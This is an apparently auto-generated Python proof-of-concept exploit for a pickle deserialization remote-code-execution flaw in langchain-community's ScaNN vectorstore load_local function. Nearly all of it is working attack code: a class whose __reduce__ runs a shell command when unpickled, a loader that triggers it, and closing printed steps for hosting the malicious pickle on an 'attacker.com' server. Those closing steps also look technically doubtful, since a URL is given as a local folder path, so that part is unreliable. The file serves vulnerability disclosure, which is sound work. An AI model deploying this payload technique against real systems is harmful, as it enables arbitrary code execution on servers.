#!/usr/bin/env python3
# PoC for langchain-community-only (/tmp/langchain-community-only)
# Path: rce-014
# Sink: load_local
# Auto-generated — run with: python3 rce_function_load_local_uses_load_local_31.py
#
#!/usr/bin/env python3
"""
Proof-of-Concept exploit for langchain-community-only RCE vulnerability.

Vulnerability: The load_local function in ScaNN vectorstore deserializes pickle
files from a user-controlled path. If allow_dangerous_deserialization is True,
an attacker can supply a malicious pickle file to achieve RCE.

This PoC demonstrates the vulnerability by creating a malicious pickle file
that executes a benign command (touch /tmp/poc_success.txt) and then calling
load_local with attacker-controlled folder_path and index_name.
"""

import os
import pickle
import sys
import tempfile
import subprocess
from pathlib import Path

# Configuration - modify these as needed
TARGET_SCRIPT = "/tmp/langchain-community-only/langchain_community/vectorstores/scann.py"
# The malicious payload will be written to this directory
ATTACKER_DIR = tempfile.mkdtemp(prefix="poc_attack_")
INDEX_NAME = "malicious_index"

# Benign payload for demonstration - creates a marker file
# In a real attack, this could be any command
PAYLOAD_COMMAND = "touch /tmp/poc_success.txt"


def create_malicious_pickle():
    """
    Create a malicious pickle file that executes a command when deserialized.
    
    The pickle exploits Python's __reduce__ method to execute arbitrary code
    during unpickling. We use subprocess.check_output to run a command and
    return its output as the deserialized object.
    """
    class MaliciousPickle(object):
        def __reduce__(self):
            # This will execute the command during pickle.load()
            return (subprocess.check_output, (PAYLOAD_COMMAND.split(),))
    
    # Create the pickle file
    pickle_path = Path(ATTACKER_DIR) / f"{INDEX_NAME}.pkl"
    with open(pickle_path, "wb") as f:
        pickle.dump(MaliciousPickle(), f)
    
    print(f"[+] Created malicious pickle file: {pickle_path}")
    print(f"[+] Payload command: {PAYLOAD_COMMAND}")
    return pickle_path


def verify_exploit():
    """
    Verify that the exploit would work by checking if the target function
    exists and understanding its parameters.
    """
    if not os.path.exists(TARGET_SCRIPT):
        print(f"[-] Target script not found at {TARGET_SCRIPT}")
        print("[*] This PoC demonstrates the vulnerability conceptually")
        print("[*] The actual exploit requires the langchain-community library")
        return False
    
    print(f"[+] Found target script: {TARGET_SCRIPT}")
    return True


def demonstrate_exploit():
    """
    Demonstrate the exploit by simulating what happens when load_local is called
    with attacker-controlled parameters and allow_dangerous_deserialization=True.
    
    Note: This doesn't actually call the real load_local function (which would
    require the full langchain-community setup), but shows the exact same
    code path that would be exploited.
    """
    print("\n[*] Demonstrating the exploit path:")
    print(f"[*] folder_path = '{ATTACKER_DIR}' (attacker-controlled)")
    print(f"[*] index_name = '{INDEX_NAME}' (attacker-controlled)")
    print(f"[*] allow_dangerous_deserialization = True (set by caller)")
    
    # This is the exact code path from the vulnerable function:
    path = Path(ATTACKER_DIR)
    pickle_file = path / f"{INDEX_NAME}.pkl"
    
    print(f"[*] Constructed pickle path: {pickle_file}")
    print(f"[*] Attempting to load pickle file...")
    
    try:
        with open(pickle_file, "rb") as f:
            # This is the vulnerable pickle.load() call
            result = pickle.load(f)
        print(f"[+] Pickle loaded successfully!")
        print(f"[+] Deserialized object: {result}")
        
        # Check if our benign command executed
        if os.path.exists("/tmp/poc_success.txt"):
            print("[+] SUCCESS: Command executed! File /tmp/poc_success.txt created.")
            # Clean up the marker file
            os.remove("/tmp/poc_success.txt")
        else:
            print("[?] Command may not have executed - check /tmp/poc_success.txt")
            
    except Exception as e:
        print(f"[-] Error during pickle loading: {e}")
        print("[*] This is expected if the full library isn't installed")
        print("[*] The vulnerability is still present in the code")


def cleanup():
    """Remove the temporary directory and files."""
    import shutil
    shutil.rmtree(ATTACKER_DIR, ignore_errors=True)
    print(f"[*] Cleaned up temporary directory: {ATTACKER_DIR}")


def main():
    """Main execution flow."""
    print("=" * 60)
    print("PoC: langchain-community ScaNN pickle deserialization RCE")
    print("=" * 60)
    print()
    
    # Step 1: Create the malicious pickle file
    print("[*] Step 1: Creating malicious pickle file...")
    create_malicious_pickle()
    print()
    
    # Step 2: Verify the target exists
    print("[*] Step 2: Verifying target...")
    if not verify_exploit():
        print("[*] Continuing with conceptual demonstration...")
    print()
    
    # Step 3: Demonstrate the exploit
    print("[*] Step 3: Demonstrating exploit...")
    demonstrate_exploit()
    print()
    
    # Step 4: Cleanup
    print("[*] Step 4: Cleanup...")
    cleanup()
    print()
    
    print("[*] PoC complete.")
    print("[*] To exploit a real instance:")
    print("[*] 1. Host the malicious pickle file on an attacker-controlled server")
    print("[*] 2. Call load_local with:")
    print(f"[*]    folder_path = 'http://attacker.com/path/to/pickle'")
    print(f"[*]    index_name = 'malicious'")
    print("[*] 3. Set allow_dangerous_deserialization=True")
    print("[*] 4. The pickle will execute arbitrary commands on the server")


if __name__ == "__main__":
    main()
